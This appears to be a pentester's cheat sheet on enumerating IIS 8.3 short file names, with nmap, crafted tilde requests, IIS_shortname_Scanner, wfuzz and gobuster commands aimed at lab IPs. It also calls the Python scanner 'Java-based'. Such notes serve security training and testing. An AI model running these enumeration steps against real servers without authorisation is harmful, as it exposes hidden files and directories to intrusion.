# IIS Tilde Enumeration (8.3 Short Names)
**Concept:** Windows systems generate short file names in the **8.3 format** (8 characters for the name, 3 for the extension) for compatibility with legacy systems. On vulnerable versions of IIS (primarily 7.5 and earlier), an attacker can enumerate these short names by observing the server's HTTP response (usually a status code difference between a found and not-found name). 
**Impact:** Information Disclosure. Reveals hidden directories and files (e.g., `ADMINI~1` instead of `Administrator`) that may not be in standard wordlists.
## 1. Discovery & Fingerprinting
**Goal:** Identify the IIS version and confirm if the server handles tilde requests.
### Service Scanning
Identify the IIS version via Nmap or HTTP headers.
```shell
# Description: Scan for IIS and risky methods
# Syntax: nmap -p <Port> -sV -sC <IP>
nmap -p 80 -sV -sC --open 10.129.224.91
```
- **Vulnerable Versions:** IIS 7.5 and earlier are frequently susceptible by default.
### Manual Verification
Test if the server responds differently to a valid vs. invalid tilde sequence.
```http
# Check for a character that might exist
GET /~a*~1****/ HTTP/1.1
Host: target.com
```
## 2. Automated Enumeration
**Goal:** Efficiently brute-force the 8.3 short names using automated tools.
### Using IIS_shortname_Scanner
This Java-based tool automates the recursive discovery of short names.
```shell
# Installation
git clone https://github.com/lijiejie/IIS_shortname_Scanner
cd IIS_shortname_Scanner

# Description: Execute automated shortname scan
# Syntax: python3 iis_shortname_scan.py <DB URL>
python3 iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db

# Create wordlist (we found poo_co~1.txt, the file name start with co)
grep "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_wordlist.txt 

# Find full filename
wfuzz -c -w co_wordlist.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
```

**Interpreting Results:**
- **Identified Directories:** `ASPNET~1`, `UPLOAD~1`
- **Identified Files:** `TRANSF~1.ASP`
## 3. Tradecraft: Reconstructing Full Names
**Goal:** Once a short name like `TRANSF~1.ASP` is found, you must determine the full filename to interact with it, as direct access via the tilde name is often blocked by modern security configurations.
### Step 1: Generate a Targeted Wordlist
Filter existing wordlists for terms starting with the discovered prefix.
```shell
# Description: Create a custom wordlist from local lists starting with 'transf'
# Syntax: egrep -r ^<prefix> <wordlist_path> | sed 's/^[^:]*://' > <output_file>
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
### Step 2: Full Name Brute-Force
Use `gobuster` with the custom list to find the actual file.
```shell
# Description: Brute-force the full name using discovered extensions
# Syntax: gobuster dir -u <URL> -w <Wordlist> -x <Extensions>
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```
- **Success:** Discovery of `/transfer.aspx`.